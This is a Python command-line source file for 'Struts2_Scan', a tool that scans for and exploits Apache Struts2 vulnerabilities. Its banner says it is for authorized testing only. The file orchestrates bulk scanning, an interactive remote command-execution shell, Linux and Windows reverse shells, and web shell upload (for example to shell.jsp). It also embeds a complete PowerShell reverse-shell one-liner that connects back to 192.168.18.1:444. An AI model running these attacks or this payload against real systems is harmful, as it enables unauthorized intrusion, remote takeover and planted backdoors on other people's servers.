import click
import os
from exploit import *
from exploit.static_tools import handle_tools
from concurrent import futures
from functools import partial


is_quiet = False

banner = '''
Struts2_Scan / Struts2框架全系列漏洞扫描工具
Code By:Jun_sheng @Github:https://github.com/jun-5heng/
橘子网络安全实验室 @https://0range.team/
*************************警 告*****************************
本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!
严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!
***********************************************************
'''

s2_dict = {
    'S2_001': S2_001, 'S2_003': S2_003, 'S2_005': S2_005, 'S2_007': S2_007, 'S2_008': S2_008, 'S2_009': S2_009,
    'S2_012': S2_012, 'S2_013': S2_013, 'S2_015': S2_015, 'S2_016': S2_016, 'S2_019': S2_019, 'S2_029': S2_029,
    'S2_032': S2_032, 'S2_033': S2_033, 'S2_037': S2_037, 'S2_045': S2_045, 'S2_046': S2_046, 'S2_048': S2_048,
    'S2_052': S2_052, 'S2_053': S2_053, 'S2_057': S2_057, 'S2_059': S2_059, 'S2_061': S2_061, 'S2_062': S2_062,
    'S2_devMode': S2_devMode
}

# 支持获取WEB路径的漏洞名称列表
webpath_names = [
    "S2_001", "S2_005", "S2_013", "S2_016", "S2_019", "S2_032", "S2_037", "S2_045", "S2_046", "S2_devMode"
]

# 支持命令执行的漏洞名称列表
exec_names = [
    "S2_001", "S2_003", "S2_004", "S2_005", "S2_007", "S2_008", "S2_009", "S2_012", "S2_013", "S2_015",
    "S2_016", "S2_019", "S2_029", "S2_032", "S2_033", "S2_037", "S2_045", "S2_046", "S2_048", "S2_052",
    "S2_052", "S2_053", "S2_057", "S2_059", "S2_061", "S2_062", "S2_devMode"
]

# 支持反弹shell的漏洞名称列表
reverse_names = [
    "S2_001", "S2_007", "S2_008", "S2_009", "S2_013", "S2_015", "S2_016", "S2_019", "S2_029", "S2_032",
    "S2_033", "S2_037", "S2_045", "S2_046", "S2_048", "S2_052", "S2_052", "S2_057", "S2_061", "S2_062",
    "S2_devMode"
]

# 支持反弹Windows的漏洞列表
winshell_names = [
    "S2_001","S2_016","S2_019", "S2_032", "S2_061", "S2_062"
]

# 未确定是否能够反弹Windows的漏洞列表
winshell_names_not = [
    "S2_007", "S2_009", "S2_012", " S2_048", "S2_029", "S2_037", "S2_046", "S2_033", "S2_053", "S2_057", "S2_059", "S2_devMode"
]

# 支持文件上传的漏洞名称列表
upload_names = ["S2_013", "S2_016", "S2_019", "S2_045", "S2_046"]

def show_info():
    """输出支持的漏洞信息"""

    click.secho("by: Jun_sheng / version 0.1")
    for k,v in s2_dict.items():
        click.secho(f"[+] 支持如下Struts2漏洞:{v.info}")

def check_one(v):
    """单个漏洞检测"""

    result = v.check()
    return result

def scan_one(url, data=None, headers=None, encoding="UTF-8"):
    """对单个URL进行扫描"""

    click.secho('[+] 正在扫描URL:' + url, fg='green')
    ss = [s(url, data, headers, encoding) for s in s2_dict.values() if s is not s2_dict.get("S2_052")]
    with futures.ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(check_one, ss))

    results = {r for r in results if r}
    click.secho('[*] ----------------results------------------'.format(url=url), fg='green')
    if (not results) and (not is_quiet):
        click.secho(f'[*] {url} 未发现漏洞', fg='red')
    for r in results:
        if r.startswith("ERROR:"):
            click.secho(f'[ERROR] {url} 访问出错: {r[6:]}', fg='red')
        else:
            click.secho(f'[*] {url} 存在漏洞: {r}', fg='red')

def read_urls(file_path, encoding="UTF-8"):
    """读取批量扫描URL文件"""

    if handle_tools.check_file(file_path):
        with open(file_path, 'r', encoding=encoding) as f:
            urls = f.readlines()
        urls = [url.strip() for url in urls if url and url.strip()]
        return urls

def scan_more(urls, data=None, headers=None, encoding="UTF-8"):
    """批量扫描URL"""

    scan = partial(scan_one, data=data, headers=headers, encoding=encoding)
    with futures.ProcessPoolExecutor(max_workers=process) as executor:
        results = list(executor.map(scan, urls))


CONTEXT_SETTINGS = dict(help_option_names=['-h','--help'])

@click.command(context_settings=CONTEXT_SETTINGS)
@click.option('-i', '--info', is_flag=True, help="漏洞信息介绍")
@click.option('-v', '--version', is_flag=True, help="显示工具版本")
@click.option('-u', '--url', help="URL地址")
@click.option('-n', '--name', help="指定漏洞名称, 漏洞名称详见info")
@click.option('-f', '--file', help="批量扫描URL文件, 一行一个URL")
@click.option('-d', '--data', help="POST参数, 需要使用的payload使用{exp}填充, 如: name=test&passwd={exp}")
@click.option('-c', '--encode', default="UTF-8", help="页面编码, 默认UTF-8编码")
@click.option('-p', '--proxy', help="HTTP代理. 格式为http://ip:port")
@click.option('-t', '--timeout', help="HTTP超时时间, 默认10s")
@click.option('-w', '--workers', help="批量扫描进程数, 默认为10个进程")
@click.option('--header', help="HTTP请求头, 格式为: key1=value1&key2=value2")
@click.option('-e', '--exec', is_flag=True, help="进入命令执行shell")
@click.option('--webpath', is_flag=True, help="获取WEB路径")
@click.option('-lr', '--lin_reverse', help="Linux反弹shell地址, 格式为ip:port")
@click.option('-wr', '--win_reverse', help="Windows反弹shell地址, 格式为ip:port")
@click.option('--reverse_method', help="Windows反弹shell方式(cmd_exec,bat_file,java_exec),默认为cmd_exe,其他两种方式可在默认方式失败的情况下尝试使用")
@click.option('--upfile', help="需要上传的文件路径和名称")
@click.option('--uppath', help="上传的目录和名称, 如: /usr/local/tomcat/webapps/ROOT/shell.jsp")
@click.option('-q', '--quiet', is_flag=True, help="关闭打印不存在漏洞的输出，只保留存在漏洞的输出")
def main(info, version, url, file, name, data, header, encode, proxy, exec, lin_reverse, win_reverse, reverse_method, upfile, uppath, quiet, timeout, workers, webpath):
    '''Struts2批量扫描利用工具'''
    global is_quiet, process

    click.secho(banner, fg='green')

    if not encode:
        encode = 'UTF-8'

    if info:
        show_info()
        exit(0)

    if version:
        click.secho("by: Jun_sheng & Mansi / version 0.2", fg='green')
        exit(0)

    if proxy:
        tools._proxies = {
            "http": proxy,
            "https": proxy
        }

    if quiet:
        is_quiet = True

    if timeout and handle_tools.check_int('timeout', timeout):
        tools.tiemout = handle_tools.check_int('timeout', timeout)

    if workers and handle_tools.check_int('workers', workers):
        process = handle_tools.check_int('workers', workers)
    else:
        process = tools._default_process

    if url and not name:
        # 扫描单个url
        scan_one(url, data, header, encode)

    if file:
        # 批量扫描url
        urls = read_urls(file)
        scan_more(urls, data, header, encode)

    if name and url:
        # 指定漏洞利用
        name = name.replace('s', 'S').replace('-', '_').replace('m', 'M')

        if name not in s2_dict.keys():
            click.secho("[ERROR] 暂不支持{name}漏洞利用".format(name=name), fg="red")
            exit(0)
        s = s2_dict[name](url, data, header, encode)
        s.check()

        if not s.is_vul:
            click.secho("[ERROR] 该URL不存在{name}漏洞".format(name=name), fg="red")
        else:
            click.secho(s.info, fg='green')
            if name in webpath_names:
                web_path = s.get_path()
                click.secho("[*] 检测到web路径：{webpath}".format(webpath=web_path), fg="green")
            else:
                click.secho("[ERROR] 漏洞{name}不支持获取WEB路径".format(name=name), fg="red")

        if webpath:
            if name in webpath_names:
                web_path = s.get_path()
                click.secho("[*] {webpath}".format(webpath=web_path), fg="red")
                exit(0)
            else:
                click.secho("[ERROR] 漏洞{name}不支持获取WEB路径".format(name=name), fg="red")
                exit(0)

        if lin_reverse:
            if name in reverse_names:
                click.secho("[*] 请在反弹地址处监听端口如: nc -lvvp 8080", fg="red")
                if ':' not in lin_reverse:
                    click.secho("[ERROR] reverse反弹地址格式不对,正确格式为: 192.168.1.10:8080", fg="red")
                ip = lin_reverse.split(':')[0].strip()
                port = lin_reverse.split(':')[1].strip()
                s.reverse_shell(ip, port)
                exit(0)
            else:
                click.secho("[ERROR] 漏洞{name}不支持反弹shell".format(name=name), fg="red")
                exit(0)

        if win_reverse:
            if name in winshell_names:
                click.secho("[*] 请在反弹地址处监听端口", fg="red")
                if ':' not in win_reverse:
                    click.secho("[ERROR] reverse反弹地址格式不对,正确格式为: 192.168.1.10:8080", fg="red")
                if reverse_method:
                    tools._method = reverse_method
                ip = win_reverse.split(':')[0].strip()
                port = win_reverse.split(':')[1].strip()
                s.reverse_shell_win(ip, port)
                exit(0)
            elif name in winshell_names_not:
                click.secho("[ERROR] 没有测试payload，可以通过命令尝试反弹(powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.18.1',444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\")".format(name=name), fg="red")
            else:
                click.secho("[ERROR] 漏洞{name}不支持反弹shell".format(name=name), fg="red")
                exit(0)

        if upfile and uppath:
            if name in upload_names and handle_tools.check_file(upfile):
                result = s.upload_shell(uppath, upfile)
                if result is True:
                    click.secho("[+] 文件上传成功!", fg="green")
                    exit(0)
                elif str(result).startswith("ERROR:"):
                    click.secho("[ERROR] 文件上传失败! {error}".format(error=result[6:]), fg="red")
                    exit(0)
                else:
                    click.secho("[ERROR] 文件上传失败! \n{error}".format(error=result), fg="red")
                    exit(0)
            else:
                click.secho("[ERROR] 漏洞{name}不支持文件上传".format(name=name), fg="red")
                exit(0)

        if exec:
            if name in exec_names:
                click.secho("[+] 提示: 输入'q'结束命令执行", fg='red')
                if name == "S2_052":
                    click.secho("[+] 提示: S2_052命令执行无回显，可将结果写入文件访问", fg='red')
                elif name == "S2_059":
                    click.secho("[+] 提示: S2_059命令执行无回显，未找到其他可回显途径", fg='red')
                elif name == "S2_004":
                    click.secho("[+] 提示: S2_004仅可读取任意文件", fg='red')
                while True:
                    cmd = input('>>>')
                    if cmd == "q":
                        break
                    result = s.exec_cmd(cmd)
                    click.secho(result, fg='red')
            else:
                click.secho("[ERROR] 漏洞{name}不支持命令执行".format(name=name), fg="red")
                exit(0)

        exit(0)

if __name__ == '__main__':
    os.environ["http_proxy"] = "http://127.0.0.1:8080"

    try:
        main()
    except KeyboardInterrupt as e:
        exit(0)
    except Exception as e:
        click.secho(f"[ERROR] {e}", fg='red')
        exit(0)
